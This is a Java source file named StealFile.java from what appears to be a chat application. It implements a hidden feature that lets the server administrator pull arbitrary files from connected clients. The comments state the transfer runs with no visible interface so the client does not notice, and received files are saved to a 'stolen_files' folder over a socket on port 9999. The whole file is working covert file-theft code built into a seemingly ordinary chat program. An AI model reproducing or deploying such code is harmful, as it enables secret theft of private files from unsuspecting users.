/*
 * Description: Class StealFile.java
 * Author: Dimtri Pankov
 * Date: 26-Feb-2011
 * Version: 1.0
 */
 
package ChatProject;

import java.awt.Toolkit;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.JOptionPane;

/**
 * The StealFile class is the class that the application uses so the server can
 * steal files from the clients the server has the button in communications tab that
 * gets the names of all files it is displayed in the JList so when the administrator
 * wants to steal a file he simply clicks on the file he needs an then just clicks the button still file
 * which is also on the ServerGUI in the communication tab that will send a message to the client which already
 * is programmed to have a potential to upload files without the client know that this will in turn create a server
 * side instance of this class which will be a server that is waiting for connection that client receives the request
 * from the server for a certain file which will turn create a client side instance of this class which connects directly
 * to the waiting server and that connection will be in charge of uploading a file from the client to the server
 * this instance is not graphical because it is hidden we do not want client to notice the upload
 * @author Dimitri Pankov
 * @see Socket
 * @see ServerSocket
 * @version 1.4
 */
public class StealFile {

    private boolean isServer = true;
    private Socket socket;
    private ServerSocket serverSocket;
    private String ipAddress;
    private FileOutputStream fos;
    private InputStream in;
    private FileInputStream fis;
    private OutputStream os;
    private volatile String filePath;
    private boolean success;

    /**
     * Overloaded constructor of the class that establishes the connection
     * between the server and the client side and starts the threads that
     * are in charge of uploading client's file to the server
     * @param isServer as a boolean that creates a server instance or client instance
     * @param ipAddress as a String which is an IP address is only used by the client side server only waits for the connection
     * @param filePath as a String to tell the client which file to upload
     */
    public StealFile(boolean isServer, String ipAddress, String filePath) {
        this.isServer = isServer;
        this.ipAddress = ipAddress;
        this.filePath = filePath;
        if (isServer) {
            try {
                serverSocket = new ServerSocket(9999);
                socket = serverSocket.accept();
                new StealFileINThread(filePath).start();
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(null, ex.toString());
            }
        } else {
            try {
                socket = new Socket(ipAddress, 9999);
                new StealFileOUTThread(filePath).start();
            } catch (Exception ex) {
                JOptionPane.showMessageDialog(null, ex.toString());
            }
        }
    }

    /**
     * The StealFileINThread class is an object that is in charge of
     * downloading the requested file from the client side reads from the socket
     * and writes to the file which creates a file with identical name as it had on the client side but all
     * stolen files are stored in the special folder called stolen files
     * @author Dimitri Pankov
     * @see Thread
     * @version 1.4
     */
    public class StealFileINThread extends Thread {

        private int bytesRead;
        private String filePath;
        private byte[] array;

        /**
         * The Overloaded constructor of the StealFileINThread class
         * which creates byte array then a directory to which the file will be uploaded
         * as well as both streams have to be created before the execution of the run method starts
         * @param filePath as a String
         * @throws IOException when working with sockets risks are unavoidable
         */
        public StealFileINThread(String filePath) throws IOException {
            array = new byte[4000];
            this.filePath = filePath;
            in = socket.getInputStream();
            success = new File("stolen_files/").mkdir();
            fos = new FileOutputStream(new File("stolen_files/" + filePath.substring(filePath.lastIndexOf("\\") + 1)));
        }

        /**
         * The run method of the server side which reads from the
         * socket and writes to the file when the upload is complete
         * we use a toolkit's beep method which makes a sound only on the server
         * side to let the administrator know that the upload has been completed
         */
        @Override
        public void run() {
            try {
                while ((bytesRead = in.read(array, 0, 4000)) > 0) {
                    fos.write(array, 0, bytesRead);
                }
                Toolkit.getDefaultToolkit().beep();
                fos.flush();
                fos.close();
                in.close();
                socket.close();
                serverSocket.close();
            } catch (Exception e) {
                try {
                    serverSocket.close();
                } catch (IOException ex) {
                    JOptionPane.showMessageDialog(null, ex.toString());
                }
                JOptionPane.showMessageDialog(null, e.toString());
            }
        }
    }

    /**
     * The StealFileOUTThread class is the client side of the thread
     * which is in charge of uploading the file to the server administrator
     * upon such request it reads from the file that was requested by the server and then
     * writes the byte arrays to the socket server will receive the data on the other side and create
     * a file out of it
     * @author Dimitri Pankov
     * @see Thread
     * @version 1.4
     */
    public class StealFileOUTThread extends Thread {

        private int bytesRead;
        private byte[] array;
        private String filePath;

        /**
         * The Overloaded constructor of the StealFileOUTThread class
         * both streams have to be created before the execution of the run method starts
         * @param filePath as a String the path to the file
         * @throws IOException when working with sockets risks are unavoidable
         */
        public StealFileOUTThread(String filePath) throws IOException {
            this.filePath = filePath;
            os = socket.getOutputStream();
            fis = new FileInputStream(new File(filePath));
            array = new byte[4000];
        }

        /**
         * The rum method of the class reads from the file
         * and writes to the socket and the other side the data will be
         * used by server to create identical file
         */
        @Override
        public void run() {
            try {
                while ((bytesRead = fis.read(array, 0, 4000)) > 0) {
                    os.write(array, 0, bytesRead);
                }
                os.flush();
                os.close();
                fis.close();
                socket.close();
            } catch (Exception e) {
                JOptionPane.showMessageDialog(null, e.toString());
            }
        }
    }
}
